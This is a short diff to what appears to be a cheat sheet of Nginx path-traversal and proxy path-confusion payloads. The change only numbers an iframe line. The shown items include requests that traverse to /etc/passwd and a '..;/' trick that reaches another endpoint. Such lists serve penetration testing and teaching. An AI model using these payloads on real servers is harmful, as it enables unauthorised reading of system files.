@@ -33,7 +33,7 @@ Nginx
 8. GET /Endpoint-To-Proxy;/../../../../etc/passwd HTTP/1.1
 9. GET /Endpoint-To-Proxy/../../../../etc/passwd%2f%2f%2f HTTP/1.1
 
-<iframe src="https://www.company.com/Endpoint-To-Proxy/..;/Endpoint-To-Iframe">
+10. <iframe src="https://www.company.com/Endpoint-To-Proxy/..;/Endpoint-To-Iframe">
 
 By including "..;/", it may be possible to trick the server into thinking that the request is for a different endpoint than the one that is actually being requested
 
